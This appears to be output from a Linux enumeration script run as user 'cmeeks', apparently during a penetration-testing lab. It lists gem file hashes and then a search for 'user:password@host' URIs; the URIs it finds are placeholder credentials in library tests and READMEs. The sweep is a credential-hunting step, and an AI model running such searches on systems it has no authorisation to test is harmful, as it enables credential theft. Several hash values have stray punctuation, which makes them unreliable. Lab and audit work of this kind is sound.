+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/nokogiri-1.10.10/patches/libxml2/0003-Update-entities-to-remove-handling-of-ssi.patch: ffc08467744bd2305d41ca882c37fa30adf3a067
+  #)There are more hashes files in the previous parent folder
+
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/actionview-6.0.3.4/lib/action_view/helpers/asset_url_helper.rb:-60aa4fdc5cea14baf5400fba1abf4f2a46a5166bad4772b1effe341570f07de9.
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/actionview-6.0.3.4/lib/action_view/helpers/cache_helper.rb::7a1156131a6928cb0026877f8b749ac9/
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/actionview-6.0.3.4/lib/action_view/helpers/url_helper.rb:"10f2163b45388899ad4d5ae948988266befcb6c3d1b2451cf657a0c293d605a6"
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/actionpack-6.0.3.4/lib/action_dispatch/middleware/cookies.rb:-848956038e692d7046deab32b7131856ab20e14e;
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/actionpack-6.0.3.4/lib/action_dispatch/request/session.rb:"e29b9ea315edf98aad94cc78c34cc9b2"
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/activerecord-6.0.3.4/lib/active_record/integration.rb:/3e1beda2cde3495f41290e1ece5d544525810214
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/activerecord-6.0.3.4/lib/active_record/relation.rb:-1850ab3d302391b85b8693e941286659"
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/globalid-0.4.2/README.md:-81d7358dd5ee2ca33189bb404592df5e8d11420e"
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/activestorage-6.0.3.4/app/assets/javascripts/activestorage.js:"5d41402abc4b2a76b9719d911017c592"
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/railties-6.0.3.4/lib/rails/application.rb: 836fa3665997a860728bcb9e9a1e704d427cfc920e79d847d79c8a9a907b9e965defa4154b2b86bdec6930adbe33f21364523a6f6ce363865724549fdfc08553
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/sprockets-4.0.2/lib/sprockets/add_source_map_comment_to_asset_processor.rb:-80af0efcc960fc2ac93eda2f7b12e3db40ab360bf6ea269ceed3bea3678326f9.
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/sprockets-4.0.2/lib/sprockets/asset.rb:-37b51d194a7513e45b56f6524f2d51f2.
+
+[+] Finding URIs with user:password@host inside key folders
+/home/cmeeks/register_hetemit/node_modules/eventsource/example/eventsource-polyfill.js:      // http://a@b/c@d => host:b auth:a path:/c@d
+/home/cmeeks/register_hetemit/node_modules/eventsource/example/eventsource-polyfill.js:    // http://a@b@c/ => user:a@b host:c
+/home/cmeeks/register_hetemit/node_modules/eventsource/example/eventsource-polyfill.js:    // http://a@b?@c => user:a host:c path:/?@c
+/home/cmeeks/register_hetemit/node_modules/faye-websocket/README.md:    origin:  'http://username:password@proxy.example.com',
+/home/cmeeks/register_hetemit/node_modules/hosted-git-info/index.js:      // https://user%3An%40me:p%40ss%3Aword@x.com/ becomes
+/home/cmeeks/register_hetemit/node_modules/hosted-git-info/index.js:      // https://user:n@me:p@ss:word@x.com/ which is all kinds of wrong.
+/home/cmeeks/register_hetemit/node_modules/request/README.md:    url = 'http://' + username + ':' + password + '@some.server.com';
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'coap://u:p@[::192.9.5.5]:61616/.well-known/r?n=Temperature': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'coap://u:p@[::192.9.5.5]:61616/.well-known/r?n=Temperature',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    href: 'http://a%0D%22%20%09%0A%3C\'b:b@c/%0D%0Ad/e?f'
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://atpass:foo%40bar@127.0.0.1/',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://atslash%2F%40:%2F%40@foo/',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:pass@_jabber._tcp.google.com:80/test',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:pass@_jabber._tcp.google.com/test',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:pass@-lovemonsterz.tumblr.com:80/rss',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:pass@-lovemonsterz.tumblr.com/rss',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:        'href': 'http://user:pass@mt0.google.com/vt/lyrs=m@114???' +
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:password@[3ffe:2a00:100:7031::1]:8080/',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://user:pw@www.example.com/',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:    'href': 'http://USER:PW@www.example.com/',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://a\r" \t\n<\'b:b@c\r\nd/e?f':{
+/home/cmeeks/register_hetemit/node_modules/url/test.js:   'http://asdf:qwer@www.example.com',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://atpass:foo%40bar@127.0.0.1/' : {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://atslash%2F%40:%2F%40@foo/' : {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:   'http://diff:auth@www.example.com/']
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  ['http://diff:auth@www.example.com',
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pass@_jabber._tcp.google.com:80/test': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pass@_jabber._tcp.google.com/test': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pass@-lovemonsterz.tumblr.com:80/rss': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pass@-lovemonsterz.tumblr.com/rss': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pass@mt0.google.com/vt/lyrs=m@114???&hl=en&src=api&x=2&y=2&z=3&s=':
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:password@[3ffe:2a00:100:7031::1]:8080': {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://user:pw@www.ExAmPlE.com/' : {
+/home/cmeeks/register_hetemit/node_modules/url/test.js:  'http://USER:PW@www.ExAmPlE.com/' : {
+/home/cmeeks/register_hetemit/node_modules/url/url.js:      // http://a@b/c@d => host:b auth:a path:/c@d
+/home/cmeeks/register_hetemit/node_modules/url/url.js:    // http://a@b@c/ => user:a@b host:c
+/home/cmeeks/register_hetemit/node_modules/url/url.js:    // http://a@b?@c => user:a host:c path:/?@c
+/home/cmeeks/register_hetemit/node_modules/websocket-driver/README.md:    proxy  = driver.proxy('http://username:password@proxy.example.com'),
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(uri.to_s).to eq("http://example:foo%0Abar@example/")
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(@uri.to_s).to eq("http://newuser:newpass@example.com")
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(@uri.to_s).to eq("http://newuser:pass@example.com")
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(@uri.to_s).to eq("http://user:newpass@example.com")
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "from 'http://user:pass@example.com/path/'" do
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "from 'http://user:pass@example.com/path/to/resource'" do
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://newuser:newpass@example.com" +
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://newuser:newpass@example.com:80" +
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "https://newuser:newpass@example.com:443" +
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "'http://user:pass@example.com/path/'" do
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "'http://user:pass@example.com/path/to/'" do
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://user:pass@example.com/path/to/resource?query=x"
+/home/cmeeks/.rvm/gems/default/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    @uri.site = "https://newuser:newpass@example.com:443"
+/home/cmeeks/.rvm/gems/default/gems/websocket-driver-0.7.3/README.md:proxy = driver.proxy('http://username:password@proxy.example.com')
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(uri.to_s).to eq("http://example:foo%0Abar@example/")
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(@uri.to_s).to eq("http://newuser:pass@example.com")
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    expect(@uri.to_s).to eq("http://user:newpass@example.com")
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "from 'http://user:pass@example.com/path/'" do
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "from 'http://user:pass@example.com/path/to/resource'" do
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://newuser:newpass@example.com" +
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://newuser:newpass@example.com:80" +
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "https://newuser:newpass@example.com:443" +
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "'http://user:pass@example.com/path/'" do
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "'http://user:pass@example.com/path/to/'" do
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:      "http://user:pass@example.com/path/to/resource?query=x"
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/spec/addressable/uri_spec.rb:    @uri.site = "https://newuser:newpass@example.com:443"
+/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/websocket-driver-0.7.3/README.md:proxy = driver.proxy('http://username:password@proxy.example.com')
+/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/websocket-driver-0.7.3/README.md:proxy = driver.proxy('http://username:password@proxy.example.com')
+/home/cmeeks/.rvm/rubies/default/share/man/man5/gemfile.5:source "https://user:password@gems\.example\.com"
+/home/cmeeks/.rvm/rubies/ruby-2.6.3/share/man/man5/gemfile.5:source "https://user:password@gems\.example\.com"
+/home/cmeeks/.rvm/rubies/ruby-2.7.0/share/man/man5/gemfile.5:source "https://user:password@gems\.example\.com"
